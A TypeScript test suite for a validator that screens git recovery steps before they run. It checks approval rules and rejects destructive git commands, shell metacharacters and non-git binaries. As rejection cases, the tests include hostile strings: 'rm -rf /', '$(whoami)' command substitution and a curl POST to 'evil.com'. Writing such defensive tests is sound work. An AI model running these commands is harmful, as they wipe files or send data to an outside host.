import { test } from 'node:test';
import * as assert from 'node:assert';
import type { RecoveryStep } from '@git-cure/shared';
import { validateRecoveryStep, validateRecoveryPlan, tokenizeCommand } from './validator';

function createStep(overrides?: Partial<RecoveryStep>): RecoveryStep {
  return {
    stepId: 'step-1',
    description: 'Test recovery step',
    command: 'git status',
    commandExplanation: 'Check repo status',
    riskLevel: 'green',
    status: 'pending',
    requiresApproval: false,
    ...overrides,
  };
}

test('tokenizeCommand correctly handles quotes and flags', () => {
  const tokens = tokenizeCommand('git commit -m "resolve conflict in app.ts"');
  assert.deepStrictEqual(tokens, ['git', 'commit', '-m', 'resolve conflict in app.ts']);
});

test('tokenizeCommand rejects shell metacharacters', () => {
  assert.strictEqual(tokenizeCommand('git status; rm -rf /'), null);
  assert.strictEqual(tokenizeCommand('git status && ls'), null);
  assert.strictEqual(tokenizeCommand('git status | grep foo'), null);
  assert.strictEqual(tokenizeCommand('git status $(whoami)'), null);
  assert.strictEqual(tokenizeCommand('git status `id`'), null);
});

test('validateRecoveryStep allows approved read-only commands without approval', () => {
  const step = createStep({
    command: 'git status --porcelain',
    requiresApproval: false,
  });
  const result = validateRecoveryStep(step);
  assert.strictEqual(result.valid, true);
  assert.strictEqual(result.mutatesRepo, false);
});

test('validateRecoveryStep allows approved mutating commands when approval is required', () => {
  const step = createStep({
    command: 'git add app.ts',
    riskLevel: 'amber',
    requiresApproval: true,
  });
  const result = validateRecoveryStep(step);
  assert.strictEqual(result.valid, true);
  assert.strictEqual(result.mutatesRepo, true);
  assert.deepStrictEqual(result.sanitizedArgs, ['add', 'app.ts']);
});

test('validateRecoveryStep rejects mutating commands without requiresApproval', () => {
  const step = createStep({
    command: 'git add app.ts',
    requiresApproval: false,
  });
  const result = validateRecoveryStep(step);
  assert.strictEqual(result.valid, false);
  assert.ok(result.errors.some((e) => e.includes('requiresApproval')));
});

test('validateRecoveryStep rejects destructive commands in MVP', () => {
  const step = createStep({
    command: 'git reset --hard HEAD~1',
    requiresApproval: true,
  });
  const result = validateRecoveryStep(step);
  assert.strictEqual(result.valid, false);
  assert.ok(result.errors.some((e) => e.includes('Destructive')));
});

test('validateRecoveryStep rejects clean command in MVP', () => {
  const step = createStep({
    command: 'git clean -fd',
    requiresApproval: true,
  });
  const result = validateRecoveryStep(step);
  assert.strictEqual(result.valid, false);
});

test('validateRecoveryStep rejects arbitrary non-git binaries', () => {
  const step = createStep({
    command: 'curl -X POST https://evil.com',
    requiresApproval: true,
  });
  const result = validateRecoveryStep(step);
  assert.strictEqual(result.valid, false);
  assert.ok(result.errors.some((e) => e.includes('Arbitrary executable blocked')));
});

test('validateRecoveryStep allows informational steps without commands', () => {
  const step = createStep({
    command: undefined,
  });
  const result = validateRecoveryStep(step);
  assert.strictEqual(result.valid, true);
});

test('validateRecoveryPlan validates sequence and aggregates errors', () => {
  const plan: RecoveryStep[] = [
    createStep({ stepId: 'step-1', command: 'git status', requiresApproval: false }),
    createStep({ stepId: 'step-2', command: 'git reset --hard', requiresApproval: true }),
  ];
  const validation = validateRecoveryPlan(plan);
  assert.strictEqual(validation.valid, false);
  assert.strictEqual(validation.errors.length, 1);
  assert.ok(validation.stepResults.get('step-1')?.valid);
  assert.strictEqual(validation.stepResults.get('step-2')?.valid, false);
});
